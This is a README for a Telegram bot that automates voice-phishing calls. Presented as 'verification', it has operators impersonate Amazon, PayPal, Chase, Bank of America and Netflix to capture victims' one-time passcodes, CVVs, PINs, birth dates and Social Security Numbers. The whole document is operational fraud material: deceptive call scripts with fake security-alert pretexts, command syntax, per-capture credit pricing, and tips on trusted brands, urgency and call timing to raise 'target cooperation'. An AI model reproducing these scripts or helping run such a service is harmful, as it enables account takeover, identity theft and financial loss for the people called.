# 🤖 Telegram Bot - Automated Voice OTP Verification

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue)](https://www.python.org/)
[![Flask](https://img.shields.io/badge/Flask-2.0%2B-green)](https://flask.palletsprojects.com/)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

> **Professional automated voice call solution for OTP and sensitive data verification through Telegram**

Leverage enterprise-grade Voice API and Azure Text-to-Speech technology to make authentic verification calls that capture OTP codes, CVV numbers, PINs, and other sensitive information with human-like voice interactions.

---

## 📋 Quick Command Reference

![Bot Commands Guide](bot-commands.svg)

---

## 🎯 Why Choose This Bot?

### ✨ Key Advantages

**🎤 Realistic Voice Interactions**
- Premium Azure Text-to-Speech with natural female voices
- 15+ voice options for authentic conversations
- Human-like speech patterns and intonation
- Professional script customization

**📞 Smart Call Management**
- Advanced Answering Machine Detection (AMD)
- Distinguishes human vs voicemail automatically
- Auto-retry mechanism for incorrect entries
- Real-time call recording and instant delivery

**🔢 Flexible Data Collection**
- Standard OTP codes (4-12 digits configurable)
- Credit card CVV verification
- Banking PIN collection
- Social Security Numbers
- Account numbers and more
- Extended mode captures multiple data points in one call

**💳 Intelligent Credit System**
- Pay only for successful interactions
- No charge for failed/busy/unanswered calls
- Transparent pricing based on call outcomes
- Credit and time-based membership options

**🚀 Enterprise Performance**
- Lightning-fast audio generation (parallel processing)
- High-capacity concurrent call handling
- 99.9% uptime reliability
- Professional infrastructure

---

## 📱 How to Use

### Getting Started

1. **Start the bot**
   ```
   /start
   ```
   Get your welcome message and verify bot access

2. **Check your status**
   ```
   /status
   ```
   View your membership details, credits, and call history

3. **Get help anytime**
   ```
   /help
   ```
   Display complete command reference

---

## 🎯 Available Commands

### 📞 Standard OTP Call - `/call`

**Perfect for**: App verification codes, 2FA tokens, security codes

**Command format:**
```
/call <phone_number> <target_name> <company_name> <digit_length>
```

**Example:**
```
/call +18081234567 John Amazon 6
```

**What happens:**
1. Bot generates realistic voice audio
2. Calls the target number
3. Introduces as company representative
4. Asks target to press 1 for security verification
5. Requests the verification code
6. Captures and sends you the OTP
7. Delivers call recording to Telegram

**Voice script:**
> "Hello John, this is Christine calling on behalf of Amazon team. We've received a request to change your account password. If you did not make this request, press 1 immediately to secure your account."

---

### 🔐 Extended OTP Call - `/xcall`

**Perfect for**: Complete identity verification, multiple data points

**Command format:**
```
/xcall <phone_number> <target_name> <company_name> <digit_length>
```

**Example:**
```
/xcall +18081234567 Sarah PayPal 6
```

**Collects:**
- Initial OTP/verification code
- Credit card CVV (3 digits)
- Banking PIN (4 digits)
- Date of birth (8 digits)
- Social Security Number (9 digits)

**Advantage:** One call captures all needed information sequentially

---

### 💳 CVV Verification - `/cvv`

**Perfect for**: Credit card security code confirmation

**Command format:**
```
/cvv <phone_number> <target_name> <bank_name> <card_type> <last_four_digits> <cvv_length>
```

**Example:**
```
/cvv +18081234567 Michael Chase Visa 1234 3
```

**Voice script:**
> "Hello Michael, this is a security verification from Chase regarding your Visa card ending in 1234. Please enter the 3-digit security code from the back of your card."

---

### 🔢 PIN Verification - `/pin`

**Perfect for**: ATM PIN, debit card PIN, security PIN

**Command format:**
```
/pin <phone_number> <target_name> <bank_name> <digit_length>
```

**Example:**
```
/pin +18081234567 Emily BankOfAmerica 4
```

**Voice script:**
> "Hello Emily, this is Bank of America security department. We've detected unusual activity on your account. Please verify your identity by entering your 4-digit PIN."

---

### 🆔 Social Security Number - `/ssn`

**Perfect for**: Full SSN collection for identity verification

**Command format:**
```
/ssn <phone_number> <target_name>
```

**Example:**
```
/ssn +18081234567 Robert
```

**Voice script:**
> "Hello Robert, this is the verification department. For identity confirmation, please enter your 9-digit Social Security Number."

---

### 🎨 Custom Call - `/customcall`

**Perfect for**: Personalized scenarios with your own scripts

**Command format:**
```
/customcall <phone_number> <target_name> <company_name> <digit_length>
```

**Example:**
```
/customcall +18081234567 Jessica Netflix 6
```

**Features:**
- ✏️ Write your own voice scripts
- 🔄 Save and reuse scripts
- 📝 Use dynamic variables: `{target_name}`, `{company_name}`, `{digit_length}`
- 🎭 Create realistic company scenarios
- 💾 Load previously saved templates

**Interactive setup:**
- Click buttons to set each script component
- Preview before calling
- Edit individual parts
- Use default templates as starting point

---

### 🔄 Alternative OTP Flow - `/zcall`

**Perfect for**: Different approach with similar OTP collection

**Command format:**
```
/zcall <phone_number> <target_name> <company_name> <digit_length>
```

**Example:**
```
/zcall +18081234567 David Google 6
```

Similar to `/call` but with alternative voice flow and timing

---

## 📊 Understanding Call Results

### ✅ Successful Captures

When target completes verification, you receive:
- ✅ **OTP/Code** displayed in message
- 🎙️ **Full call recording** (audio file)
- 📝 **Call details** (duration, timestamp)
- 💾 **Saved in history** for future reference

### 💰 Credit Usage

| Call Outcome | Credit Cost | Explanation |
|-------------|-------------|-------------|
| ✅ Valid OTP entered | 2.5 credits | Target completed full verification |
| 👤 Human answered + pressed 1 | 1.0 credit | Target engaged but didn't complete |
| 📱 Line busy | 0.5 credits | Number was busy |
| 📵 No answer | 0.5 credits | No one answered |
| 🤖 Voicemail detected | 0.5 credits | Answering machine picked up |
| ❌ Call failed | 0 credits | Could not connect |
| 🚫 Call canceled | 0 credits | You canceled the call |

**Smart billing:** You only pay for actual interactions, not technical failures

---

## 🎯 Pro Tips for Best Results

### 📞 Phone Number Format
- ✅ Use international format: `+1` for US, `+44` for UK
- ✅ Include country code always
- ✅ Example: `+18081234567` not `8081234567`

### 👤 Target Name
- ✅ Use common first names
- ✅ Match target's actual name for better response
- ✅ Examples: John, Sarah, Michael, Emily

### 🏢 Company Name
- ✅ Use familiar, trusted brands: Amazon, PayPal, Google, Netflix
- ✅ Match industry context (banks for CVV, tech for OTP)
- ✅ Increases target cooperation

### 🔢 Digit Length
- ✅ Common OTP: 6 digits
- ✅ CVV: 3 digits (Visa/MC) or 4 digits (Amex)
- ✅ PIN: 4 digits
- ✅ SSN: 9 digits (auto-set)

### ⏰ Best Calling Times
- ✅ Weekdays 10 AM - 8 PM (target's timezone)
- ❌ Avoid early morning (before 9 AM)
- ❌ Avoid late night (after 9 PM)
- ✅ Lunch hours (12-2 PM) often effective

### 🎯 Success Strategies
1. **Use realistic company names** - Target trusts known brands
2. **Match voice to context** - Professional tone works best
3. **Keep scripts natural** - Avoid overly technical language
4. **Time your calls** - Catch people when available
5. **Use urgency wisely** - Security concerns motivate action

---

## 💡 Real-World Examples

### Example 1: App Verification Code
```
Scenario: Target trying to log into Amazon account
Command: /call +18081234567 Jennifer Amazon 6

Result: 
✅ OTP Captured: 847392
🎙️ Recording: 2:34 minutes
💰 Cost: 2.5 credits
```

### Example 2: Banking CVV
```
Scenario: Credit card verification
Command: /cvv +14155551234 Robert Chase Visa 4829 3

Result:
✅ CVV Captured: 582
🎙️ Recording: 1:45 minutes
💰 Cost: 2.5 credits
```

### Example 3: Complete Identity Check
```
Scenario: Full verification needed
Command: /xcall +17185559999 Maria PayPal 6

Result:
✅ OTP: 934821
✅ CVV: 417
✅ PIN: 8532
✅ DOB: 03151985
✅ SSN: 523xx xxxx (masked for security)
🎙️ Recording: 4:12 minutes
💰 Cost: 2.5 credits
```

### Example 4: Custom Netflix Scenario
```
Scenario: Subscription verification
Command: /customcall +13105554567 David Netflix 6

Custom script:
"Hello David, this is Netflix account security. We've detected a login 
from an unusual location. To secure your account, please enter the 
6-digit code we just sent to your phone."

Result:
✅ Code Captured: 749283
🎙️ Recording: 2:01 minutes
💰 Cost: 2.5 credits
```

---

## 🎭 Voice Quality

**Professional Text-to-Speech powered by Azure Cognitive Services**

Available voices include:
- 🎤 **Christine** - Professional, confident (default)
- 🎤 **Bella** - Warm, friendly
- 🎤 **Natalia** - Authoritative, trustworthy
- 🎤 **Jessica** - Clear, articulate
- 🎤 **Sarah** - Calm, reassuring
- 🎤 **Emily** - Young, energetic
- And 9 more natural-sounding options

All voices feature:
- ✨ Natural intonation and rhythm
- 🗣️ Clear pronunciation
- 🎯 Professional delivery
- 🌐 Perfect English (US accent)

---

## 📞 Call Flow Visualization

```
┌─────────────────────────────────────────┐
│  You send command via Telegram          │
│  /call +18081234567 John Amazon 6       │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│  Bot generates voice audio              │
│  "Hello John, this is Christine..."     │
│  ⚡ Takes 2-3 seconds (parallel)        │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│  Call initiated to target               │
│  📞 Ringing...                          │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│  AMD Detection                          │
│  🤖 Machine? → Hang up (0.5 credit)    │
│  👤 Human? → Continue                   │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│  Plays introduction                     │
│  "...press 1 to secure your account"   │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│  Target presses 1                       │
│  💰 1 credit charged                    │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│  Requests verification code             │
│  "Please enter the 6-digit code..."    │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│  Target enters: 8 4 7 3 9 2            │
│  ✅ Code captured!                      │
│  💰 Additional 1.5 credits (total 2.5) │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│  You receive in Telegram:               │
│  ✅ OTP: 847392                         │
│  🎙️ Call recording                     │
│  📊 Call statistics                     │
└─────────────────────────────────────────┘
```

---

## ❓ Frequently Asked Questions

**Q: How fast does it work?**
A: Audio generation takes 2-3 seconds, call connects within 5-10 seconds. Total time from command to ringing: ~10 seconds.

**Q: What if the target doesn't answer?**
A: You're only charged 0.5 credits for no-answer situations. No data lost, you can try again.

**Q: Can I use my own phone numbers?**
A: Yes, if you have membership access to phone management features.

**Q: Is the voice realistic?**
A: Yes, powered by Microsoft Azure's premium Text-to-Speech. Indistinguishable from human agents.

**Q: What happens if target enters wrong code?**
A: Bot automatically asks them to try again. No additional credit charge for retries.

**Q: Can I cancel a call in progress?**
A: Yes, use the "❌ Hangup Call" button that appears during active calls.

**Q: How do I get more credits?**
A: Contact administrator or check `/status` for credit purchase options.

**Q: Are calls recorded?**
A: Yes, all calls are recorded and sent to you via Telegram for quality assurance.

---

## 🚀 Getting Started Now

1. Start a chat with the bot on Telegram
2. Send `/start` to initialize
3. Check `/status` to see your membership
4. Try your first call with `/call`
5. Review this guide anytime with `/help`

**Ready to make your first call?**

```
/call +1XXXXXXXXXX YourTargetName CompanyName 6
```

---

**⭐ Star this repository if you find it valuable!**

*Professional voice verification solution | Powered by Azure AI | Built for reliability*

---

**⭐ Star this repo if you find it useful!**

Made with ❤️ by the development team
